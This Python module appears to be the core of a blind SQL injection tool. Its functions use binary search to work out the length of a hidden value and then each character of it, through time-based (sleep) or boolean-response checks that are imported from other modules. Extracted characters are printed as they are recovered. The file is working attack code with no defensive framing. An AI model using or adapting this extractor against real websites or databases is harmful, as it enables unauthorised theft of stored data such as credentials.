
import config
import time
import myEnum
from check import sleep_inject_check_fn, boolean_inject_check_fn

def binary_search_value(length, payload):

  def binary_search_value_check(_payload):
    if config.INJECT_TYPE == myEnum.SQL_INJECT_TYPE.SLEEP_INJECT:
      return sleep_inject_check_fn(_payload)
    else:
      res = boolean_inject_check_fn(_payload)
      if res == config.boolean_inject_success_return_value:
        return True
      elif res == config.boolean_inject_failure_return_value:
        return False
      else:
        time.sleep(config.boolean_inject_timeoutSlepp)
        return binary_search_value_check(_payload)

  ans = ''
  for i in range(1, length + 1):
    l, r = 0, 127
    while l < r:
      mid = (l + r + 1) // 2
      if binary_search_value_check(payload(i, mid)):
        l = mid
      else:
        r = mid - 1
    print(chr(l), end="",flush=True)
    
    ans += chr(l)

  return ans

def binary_search_len(payload, l = 0, r = 1000):
  
  def binary_search_len_check(payload):
    if config.INJECT_TYPE == myEnum.SQL_INJECT_TYPE.SLEEP_INJECT:
      return sleep_inject_check_fn(payload)
    else:
      res = boolean_inject_check_fn(payload)
      if res == config.boolean_inject_success_return_value:
        return True
      elif res == config.boolean_inject_failure_return_value:
        return False
      else:
        print(payload, res)
        time.sleep(config.boolean_inject_timeoutSlepp)
        return binary_search_len_check(payload)

  # 最大最小值
  while l < r:
    mid = (l + r + 1) // 2
    res = binary_search_len_check(payload(mid))
    print(f'\r{l} {mid} {r}, {res}', end="")
    if res:
      l = mid
    else:
      r = mid - 1
  print('\r', end="")
  return l
